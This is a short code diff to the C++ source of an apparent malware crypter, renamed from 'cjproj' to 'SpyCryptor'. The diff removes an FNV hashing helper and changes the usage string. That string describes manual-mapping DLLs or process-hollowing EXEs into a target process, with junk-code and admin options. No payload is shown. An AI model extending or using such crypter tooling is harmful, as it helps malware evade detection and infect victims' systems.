@@ -456,20 +456,10 @@ int CrypterPackageInit(CrypterPackageCtx* ctx, const char* filepath)
 	return 0;
 }
 
-
 mConfig config;
 mRandom random;
 mImport import;
 DWORD   max_build_procs = 0;
-
-namespace fnv {
-	constexpr uint32_t offsetBasis = 0x811c9dc5;
-	constexpr uint32_t prime = 0x1000193;
-	constexpr uint32_t hash(const char* str, const uint32_t value = offsetBasis) noexcept
-	{
-		return *str ? hash(str + 1, (value ^ *str) * static_cast<unsigned long long>(prime)) : value;
-	}
-}
 
 void main(int argc, char* argv[])
 {
@@ -533,7 +523,7 @@ void main(int argc, char* argv[])
 	if (argc < 5 || !input || !output)
 	{
 		//manual map (if source is dll) or process hollow (if source is exe)
-		printf("Usage: cjproj.exe -in \"file.exe|dll\" -out exe|dll [-target \"process.exe\"] [-console] [-gentrash] [-requireadmin]\r\n"); 
+		printf("Usage: SpyCryptor.exe -in \"file.exe|dll\" -out exe|dll [-target \"process.exe\"] [-console] [-gentrash] [-requireadmin]\r\n"); 
 		system("pause");
 		return;
 	}
@@ -801,4 +791,3 @@ void main(int argc, char* argv[])
 	system("pause");
 
 }
- 
